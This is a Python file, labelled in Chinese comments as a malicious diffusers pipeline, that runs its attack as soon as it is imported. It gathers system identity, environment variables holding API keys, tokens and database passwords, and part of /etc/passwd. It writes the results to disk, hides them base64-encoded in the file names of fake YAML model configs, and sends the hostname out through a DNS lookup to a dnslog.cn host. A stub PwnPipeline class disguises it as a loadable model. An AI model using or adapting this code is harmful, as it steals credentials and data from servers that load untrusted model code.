# 恶意 diffusers pipeline: import 时执行命令 + 定义 PwnPipeline 类
import os, subprocess, base64, sys

# 模块级执行 (import 即触发)
def _pwn():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai|mysql|redis|postgres|aws|gcp' | head -50; echo ===PASSWD===; head -10 /etc/passwd 2>/dev/null; echo ===HOSTS===; cat /etc/hosts 2>/dev/null | head -8", shell=True, stderr=subprocess.STDOUT, timeout=20)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    for p in ["/models/PWNED-RESULT.txt", "/tmp/PWNED-RESULT.txt", "/build/models/PWNED-RESULT.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
    # 写 .yaml 模型配置 (watcher 扫描注册 -> 模型名=文件名)
    try:
        seg = 30
        for i in range(0, len(b64), seg):
            part = b64[i:i+seg]
            try:
                with open("/models/XFR-" + part + ".yaml", "w") as f:
                    f.write("name: XFR-" + part + "\nbackend: llama-cpp\nmodel: /models/dummy.gguf\n")
            except: pass
    except: pass
    # DNS 外带
    try:
        import socket
        socket.setdefaulttimeout(3)
        host = open("/etc/hostname").read().strip()[:40] if os.path.exists("/etc/hostname") else "nohost"
        socket.gethostbyname(host.replace(".","-") + ".hc92gc.dnslog.cn")
    except: pass

try:
    _pwn()
except Exception:
    pass

# diffusers 需要的最小 pipeline 类
class PwnPipeline:
    def __init__(self, *args, **kwargs):
        pass
    def __call__(self, *args, **kwargs):
        return {"images": []}
    @classmethod
    def from_pretrained(cls, *args, **kwargs):
        return cls()
